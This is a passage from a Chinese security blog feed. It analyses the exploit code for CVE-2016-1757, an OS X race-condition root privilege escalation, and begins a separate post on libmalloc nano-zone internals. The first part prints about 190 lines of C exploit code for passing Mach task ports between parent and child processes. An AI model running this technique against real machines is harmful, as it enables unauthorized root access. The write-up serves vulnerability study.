<h3 id="2-1_源码">2.1 源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">  <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">  <span class="keyword">mach_msg_port_descriptor_t</span> port;</span><br><span class="line">&#125; <span class="keyword">port_msg_send_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mach message for receiving a port right</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">  <span class="keyword">mach_msg_body_t</span> body;</span><br><span class="line">  <span class="keyword">mach_msg_port_descriptor_t</span> port;</span><br><span class="line">  <span class="keyword">mach_msg_trailer_t</span> trailer;</span><br><span class="line">&#125; <span class="keyword">port_msg_rcv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span>  header;</span><br><span class="line">&#125; <span class="keyword">simple_msg_send_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">mach_msg_header_t</span>  header;</span><br><span class="line">  <span class="keyword">mach_msg_trailer_t</span> trailer;</span><br><span class="line">&#125; <span class="keyword">simple_msg_rcv_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a copy in the parent of the stolen special port such that it can be restored</span></span><br><span class="line"><span class="keyword">mach_port_t</span> saved_special_port = MACH_PORT_NULL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the shared port right in the parent</span></span><br><span class="line"><span class="keyword">mach_port_t</span> shared_port_parent = MACH_PORT_NULL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_shared_port</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line">  <span class="comment">// get a send right to the port we're going to overwrite so that we can both</span></span><br><span class="line">  <span class="comment">// restore it for ourselves and send it to our child</span></span><br><span class="line">  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &amp;saved_special_port);</span><br><span class="line">  MACH_ERR(<span class="string">"saving original special port value"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allocate the shared port we want our child to have a send right to</span></span><br><span class="line">  err = mach_port_allocate(mach_task_self(),</span><br><span class="line">                           MACH_PORT_RIGHT_RECEIVE,</span><br><span class="line">                           &amp;shared_port_parent);</span><br><span class="line"></span><br><span class="line">  MACH_ERR(<span class="string">"allocating shared port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// insert the send right</span></span><br><span class="line">  err = mach_port_insert_right(mach_task_self(),</span><br><span class="line">                               shared_port_parent,</span><br><span class="line">                               shared_port_parent,</span><br><span class="line">                               MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line">  MACH_ERR(<span class="string">"inserting MAKE_SEND into shared port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);</span><br><span class="line">  MACH_ERR(<span class="string">"setting special port"</span>, err);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> recover_shared_port_child() &#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// grab the shared port which our parent stashed somewhere in the special ports</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> shared_port_child = MACH_PORT_NULL;</span><br><span class="line">  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &amp;shared_port_child);</span><br><span class="line">  MACH_ERR(<span class="string">"child getting stashed port"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"child got stashed port"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// say hello to our parent and send a reply port so it can send us back the special port to restore</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// allocate a reply port</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> reply_port;</span><br><span class="line">  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;reply_port);</span><br><span class="line">  MACH_ERR(<span class="string">"child allocating reply port"</span>, err); </span><br><span class="line"></span><br><span class="line">  <span class="comment">// send the reply port in a hello message</span></span><br><span class="line">  <span class="keyword">simple_msg_send_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  msg.header.msgh_size = <span class="keyword">sizeof</span>(msg);</span><br><span class="line">  msg.header.msgh_local_port = reply_port;</span><br><span class="line">  msg.header.msgh_remote_port = shared_port_child;</span><br><span class="line">  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;msg.header);</span><br><span class="line">  MACH_ERR(<span class="string">"child sending task port message"</span>, err);</span><br><span class="line"> </span><br><span class="line">  LOG(<span class="string">"child sent hello message to parent over shared port"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a message on the reply port containing the stolen port to restore</span></span><br><span class="line">  <span class="keyword">port_msg_rcv_t</span> stolen_port_msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;stolen_port_msg.header, MACH_RCV_MSG, <span class="number">0</span>, <span class="keyword">sizeof</span>(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line">  MACH_ERR(<span class="string">"child receiving stolen port\n"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// extract the port right from the message</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> stolen_port_to_restore = stolen_port_msg.port.name;</span><br><span class="line">  <span class="keyword">if</span> (stolen_port_to_restore == MACH_PORT_NULL) &#123;</span><br><span class="line">    FAIL(<span class="string">"child received invalid stolen port to restore"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// restore the special port for the child</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);</span><br><span class="line">  MACH_ERR(<span class="string">"child restoring special port"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"child restored stolen port"</span>);</span><br><span class="line">  <span class="keyword">return</span> shared_port_child;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> recover_shared_port_parent() &#123;</span><br><span class="line">  <span class="keyword">kern_return_t</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// restore the special port for ourselves</span></span><br><span class="line">  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);</span><br><span class="line">  MACH_ERR(<span class="string">"parent restoring special port"</span>, err);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for a message from the child on the shared port</span></span><br><span class="line">  <span class="keyword">simple_msg_rcv_t</span> msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  err = mach_msg(&amp;msg.header,</span><br><span class="line">                 MACH_RCV_MSG,</span><br><span class="line">                 <span class="number">0</span>,</span><br><span class="line">                 <span class="keyword">sizeof</span>(msg),</span><br><span class="line">                 shared_port_parent,</span><br><span class="line">                 MACH_MSG_TIMEOUT_NONE,</span><br><span class="line">                 MACH_PORT_NULL);</span><br><span class="line">  MACH_ERR(<span class="string">"parent receiving child hello message"</span>, err);</span><br><span class="line"></span><br><span class="line">  LOG(<span class="string">"parent received hello message from child"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// send the special port to our child over the hello message's reply port</span></span><br><span class="line">  <span class="keyword">port_msg_send_t</span> special_port_msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  special_port_msg.header.msgh_size        = <span class="keyword">sizeof</span>(special_port_msg);</span><br><span class="line">  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;</span><br><span class="line">  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;</span><br><span class="line">  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), <span class="number">0</span>) | MACH_MSGH_BITS_COMPLEX;</span><br><span class="line"></span><br><span class="line">  special_port_msg.body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  special_port_msg.port.name        = saved_special_port;</span><br><span class="line">  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line">  err = mach_msg_send(&amp;special_port_msg.header);</span><br><span class="line">  MACH_ERR(<span class="string">"parent sending special port back to child"</span>, err);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> shared_port_parent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  parse_args(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// check that the original is actually a 64-bit mach-o and not a fat binary</span></span><br><span class="line">  verify_original(original, original_length);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// apply the patch to the original</span></span><br><span class="line">  apply_patch(original, original_length, patch, patch_length);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> tries = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    setup_shared_port();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> child_pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (child_pid == -<span class="number">1</span>) &#123;</span><br><span class="line">      FAIL(<span class="string">"forking"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_pid == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">mach_port_t</span> shared_port_child = recover_shared_port_child();</span><br><span class="line">      do_child(shared_port_child);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">mach_port_t</span> shared_port_parent = recover_shared_port_parent();</span><br><span class="line">      do_parent(shared_port_parent);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">int</span> status;</span><br><span class="line">      wait(&amp;status);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (status == <span class="number">0</span>) &#123;</span><br><span class="line">        LOG(<span class="string">"worked :-)"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      tries++;</span><br><span class="line">      <span class="keyword">if</span> (tries &gt; max_tries) &#123;</span><br><span class="line">        FAIL(<span class="string">"either didn't win the race (try again) or we won but the child didn't exit cleanly with a 0 return code"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      LOG(<span class="string">"trying again..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过一个<code>saved_special_port</code>完成了，父进程与子进程之间的<code>port</code>传递，从而使得父进程与子进程共享同一个<code>port</code>，子进程再通过共享的<code>port</code>，将自身的<code>task</code>的<code>port</code>发送给父进程并最终在父进程中实现对子进程代码段修改，执行任意代码，详情见<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">这里</a>。</p>
<h3 id="2-2_解析">2.2 解析</h3><ol>
<li>父进程通过<code>task_get_special_port</code>获取他的<code>special ports</code>，并存储在局部变量中。<code>special ports</code>是一些连接着系统服务的<code>port</code>，在<code>fork</code>的过程中，子进程会继承<code>special port</code>。</li>
<li>父进程通过<code>mach_port_allocate</code>函数创建一个新的<code>port</code>，通过<code>task_set_special_port</code>将这个新的<code>port</code>设为<code>special port</code>，且通过<code>mach_port_insert_right</code>为这个新的<code>port</code>赋予写的权限。并最终试图将这个新的<code>port</code>传递给子进程。</li>
<li>父进程进行<code>fork</code>，子进程继承了<em>[2]</em>中创建的新的<code>port</code>，作为自己的<code>special port</code>。</li>
<li>父进程将保存的在临时变量中的<code>special port</code>，重新设置回来。</li>
<li>子进程获取这个替换过的<code>special port</code>，并且保存下来。</li>
<li>子进程通过继承的<code>special port</code>和父进程通信。</li>
<li>父进程在收到子进程的消息后，将当前的<code>special port</code>再发送给子进程。</li>
<li>子进程也将收到的<code>special port</code>设置为自己的<code>special port</code>。</li>
</ol>
<p>时序图大致如下：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/port_dance.png" alt="port dance"></p>
<p>通过上面的分析，可以得知，再利用这个漏洞的时候，我们想要的就是一个父进程与子进程共同持有，且可以用来交流的<code>port</code>，通过这个<code>port</code>，子进程可以将自己的<code>task port</code>交给另外一个进程，这里是父进程，来实现漏洞的利用。</p>
<h1 id="0x03_server&amp;client">0x03 server&amp;client</h1><p>那么新的<code>EXP</code>使用了什么方法实现的呢？</p>
<h2 id="3-1_bootstrap_register">3.1 bootstrap_register</h2><p>每一个<code>task</code>可以调用<code>bootstrap_register()</code>函数，向<code>bootstrap server</code>注册一个服务，通过一个字符串与自己的<code>task port</code>相关联。其他的<code>task</code>可以通过<code>bootstrap_look_up</code>函数来通过字符串查询对应的<code>task</code>的<code>port</code>。</p>
<p>那么问题就一目了然了。</p>
<ul>
<li>建了一个进程A，通过<code>bootstrap_register</code>注册一个服务。</li>
<li>建立一个进程B，通过<code>bootstrap_look_up</code>获取进程A的<code>task port</code>。</li>
<li>进程B通过进程A的<code>task port</code>将自己的<code>task port</code>告知进程A。</li>
<li>进程A通过进程B的<code>task port</code>配合进程B，出发漏洞。</li>
</ul>
<p>​    </p>
<h2 id="3-2_bootstrap_register2">3.2 bootstrap_register2</h2><p>这个方案虽然简单明了，但是缺有一个问题，<code>bootstrap_register</code>在10.5之后的版本就没有了。</p>
<p>不过网上有个一简单的替代方法，在-[NSMachBootstrapServer registerPort:name:]中封装了一个<code>bootstrap_register2</code>，只不过并没有导出到外部，所以只需要添加一行代码就可以使用<code>bootstrap_register2</code>来完成相应的功能。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span><br><span class="line"> * this is not exported so we need to declare it</span><br><span class="line"> * we need to use this because bootstrap_create_server is broken in Yosemite</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> kern_return_t <span class="title">bootstrap_register2</span><span class="params">(mach_port_t bp, name_t service_name, mach_port_t sp, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<h2 id="3-3_实际代码">3.3 实际代码</h2><p>摘取利用代码中相关代码段。</p>
<p>mach_server.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* register the server with launchd */</span></span><br><span class="line">kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;server_port);</span><br><span class="line">   </span><br><span class="line">kr = mach_port_insert_right(mach_task_self(), server_port, server_port, MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line"></span><br><span class="line">kr = bootstrap_register2(bootstrap_port, SERVICE_NAME, server_port, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* alternative method to register with launchd */</span></span><br></pre></td></tr></table></figure>
<p>mach_client.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DEBUG_MSG(<span class="string">"Looking up server..."</span>);</span><br><span class="line">kr = bootstrap_look_up(bootstrap_port, SERVICE_NAME, &amp;server_port);</span><br><span class="line">EXIT_ON_MACH_ERROR(<span class="string">"bootstrap_look_up"</span>, kr, BOOTSTRAP_SUCCESS);</span><br><span class="line"></span><br><span class="line">kr = mach_port_allocate(mach_task_self(),        <span class="comment">// our task is acquiring</span></span><br><span class="line">                        MACH_PORT_RIGHT_RECEIVE, <span class="comment">// a new receive right</span></span><br><span class="line">                        &amp;client_port);           <span class="comment">// with this name</span></span><br></pre></td></tr></table></figure>
<h1 id="0x04_小结">0x04 小结</h1><p>有兴趣的读者可以仔细阅读<a href="https://github.com/gdbinit/mach_race" target="_blank" rel="external">fG!的利用</a>，与之前的利用代码的不同之处并不止在<code>mach message</code>的利用这一点上。以后有时间还会做出更细致的分析。</p>
<h1 id="引用">引用</h1><p>1.Inter-Process Communication</p>
<p><a href="http://nshipster.com/inter-process-communication/" target="_blank" rel="external">http://nshipster.com/inter-process-communication/</a></p>
<p>2.Debugging Mach Ports</p>
<p><a href="https://robert.sesek.com/2012/1/debugging_mach_ports.html" target="_blank" rel="external">https://robert.sesek.com/2012/1/debugging_mach_ports.html</a></p>
<p>3.Changes to XNU Mach IPC</p>
<p><a href="https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html" target="_blank" rel="external">https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html</a></p>
<p>4.A Little IPC Project</p>
<p><a href="http://www.nongnu.org/hurdextras/ipc_guide/mach_ipc_basic_concepts.html" target="_blank" rel="external">http://www.nongnu.org/hurdextras/ipc_guide/mach_ipc_basic_concepts.html</a></p>
<p>5.深入理解RunLoop</p>
<p><a href="http://blog.ibireme.com/2015/05/18/runloop/" target="_blank" rel="external">http://blog.ibireme.com/2015/05/18/runloop/</a></p>
<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1757">CVE-2016-1757</a>是一个<code>OS X</code>系统上通过条件竞争实现任意代码在<code>root</code>权限执行的漏洞。在这篇文章之前，我已经分析过了这个漏洞的原理，以及<code>EXP</code>代码的实现。</p>
<p><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757简单分析</a></p>
<p><a href="http://turingh.github.io/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/">CVE-2016-1757利用程序分析</a></p>
<p><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">利用patch绕过kextload对内核签名的检测</a></p>
<p>在<code>syscan2016</code>上又有国外的安全研究人员放出自己的<a href="https://github.com/gdbinit/mach_race">利用代码</a>。学习之后，这个利用代码确实比之前的更加清晰、明确。更加容易理解。</p>
<p>而两个利用本质上面的不同是对<code>mach port</code>的不同的利用方法。下面主要结合两个不同的POC，来分析一下<code>mach message</code>的使用，同时也是研究<code>xnu</code>的<code>IPC</code>的基础。</p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="execv" scheme="http://turingh.github.io/tags/execv/"/>
    
      <category term="ports" scheme="http://turingh.github.io/tags/ports/"/>
    
      <category term="race" scheme="http://turingh.github.io/tags/race/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[libmalloc源码分析之nanozone_s的处理]]></title>
    <link href="http://turingh.github.io/2016/06/28/libmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8Bnanozone-s%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <id>http://turingh.github.io/2016/06/28/libmalloc源码分析之nanozone-s的处理/</id>
    <published>2016-06-29T02:11:53.000Z</published>
    <updated>2016-06-30T02:58:54.000Z</updated>
    <content type="html"><![CDATA[<h1 id="摘要">摘要</h1><p>根据申请内存的大小不同，<code>libmalloc</code>会从不同的堆上空间将内存分配给申请者，而最小的一个一档，是从<code>nano_zone_s</code>中，通过<code>nano_*</code>函数获取堆上已分配的内存。</p>
<a id="more"></a>
<h1 id="nano_zone_s">nano_zone_s</h1><p><code>nano_zone_s</code>的数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nanozone_s &#123;				<span class="comment">// vm_allocate()'d, so page-aligned to begin with.</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		basic_zone;		<span class="comment">// first page will be given read-only protection</span></span><br><span class="line">	<span class="keyword">uint8_t</span>			pad[PAGE_MAX_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">malloc_zone_t</span>)];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// remainder of structure is R/W (contains no function pointers)</span></span><br><span class="line">	<span class="comment">// page-aligned</span></span><br><span class="line">	<span class="keyword">struct</span> nano_meta_s		meta_data[NANO_MAG_SIZE][NANO_SLOT_SIZE]; <span class="comment">// max: NANO_MAG_SIZE cores x NANO_SLOT_SIZE slots for nano blocks &#123;16 .. 256&#125;</span></span><br><span class="line">	_malloc_lock_s			band_resupply_lock[NANO_MAG_SIZE];</span><br><span class="line">    <span class="keyword">uintptr_t</span>           band_max_mapped_baseaddr[NANO_MAG_SIZE];</span><br><span class="line">	<span class="keyword">size_t</span>			core_mapped_size[NANO_MAG_SIZE];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span>			debug_flags;</span><br><span class="line">	<span class="keyword">unsigned</span>			our_signature;</span><br><span class="line">	<span class="keyword">unsigned</span>			phys_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			logical_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			hyper_shift;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* security cookie */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span>			cookie;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * The nano zone constructed by create_nano_zone() would like to hand off tiny, small, and large</span><br><span class="line">	 * allocations to the default scalable zone. Record the latter as the "helper" zone here.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		*helper_zone;</span><br><span class="line">&#125; <span class="keyword">nanozone_t</span>;</span><br></pre></td></tr></table></figure>
<p>在<a href="http://turingh.github.io/2016/06/28/libmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96/#szone_t、nanozone_t">libmalloc源码分析之初始化</a>中做过简单的介绍，这个数据结构中，主要需要理解的是几个宏和一个数据结构。</p>
<h2 id="一些需要理解的宏定义">一些需要理解的宏定义</h2><h3 id="NANO_MAX_SIZE">NANO_MAX_SIZE</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hexcolor">#def</span>ine NANO_MAX_SIZE			<span class="number">256</span> </span><br><span class="line"><span class="comment">/* Buckets sized &#123;16, 32, 48, 64, 80, 96, 112, ...&#125; */</span></span><br></pre></td></tr></table></figure>
<p>定义了<code>nano_zone</code>中可以申请的内存块的最大值为256</p>
